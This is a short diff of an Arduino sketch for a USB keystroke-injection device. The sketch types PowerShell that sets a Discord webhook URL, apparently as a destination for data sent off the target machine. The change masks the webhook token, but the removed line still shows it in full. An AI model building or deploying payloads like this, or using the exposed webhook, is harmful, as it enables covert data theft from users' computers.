@@ -9,7 +9,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(4000);
 
-  DigiKeyboard.print("$env:WH='https://discord.com/api/webhooks/1517427558420054198/-8a4h7mu722-aJkMZUXcuricWD94aFAc_GxrdFma7BBMC805cZIv1LkWHO_mA28W21s-'");
+  DigiKeyboard.print("$env:WH='https://discord.com/api/webhooks/***-'");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(400);
 
